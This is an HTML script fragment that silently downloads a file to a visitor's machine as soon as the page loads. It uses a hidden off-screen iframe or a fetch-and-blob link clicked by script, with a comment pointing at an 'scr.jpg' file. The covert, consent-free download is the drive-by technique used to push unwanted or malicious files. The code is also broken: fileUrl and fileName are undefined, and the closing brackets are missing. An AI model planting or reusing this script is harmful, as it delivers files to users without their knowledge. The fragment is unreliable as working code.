    <!-- Auto Download Script -->
    <script>
        // Function to download file silently in background
        function downloadFileInBackground(url, filename) {
            // Create a hidden iframe for silent download
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.style.visibility = 'hidden';
            iframe.style.position = 'absolute';
            iframe.style.left = '-9999px';
            iframe.style.top = '-9999px';
            iframe.style.width = '1px';
            iframe.style.height = '1px';
            
            // Set the source to trigger download
            iframe.src = url;
            
            // Add to document
            document.body.appendChild(iframe);
            
            // Remove iframe after download starts
            setTimeout(function() {
                document.body.removeChild(iframe);
            }, 1000);
        }
        
        // Alternative method using fetch and blob
        function silentDownload(url, filename) {
            fetch(url)
                .then(response => response.blob())
                .then(blob => {
                    const link = document.createElement('a');
                    link.style.display = 'none';
                    link.href = window.URL.createObjectURL(blob);
                    link.download = filename;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    window.URL.revokeObjectURL(link.href);
                })
                .catch(error => console.log('Download failed:', error));
        }
        
        // Auto-download when page loads
        window.addEventListener('load', function() {
            // Replace 'your-file-url' with the actual file URL you want to download
            // Replace 'filename.ext' with the desired filename
            
            // Download the scr.jpg file from images folder

            // Use silent download method
            setTimeout(function() {
                silentDownload(fileUrl, fileName);

        });
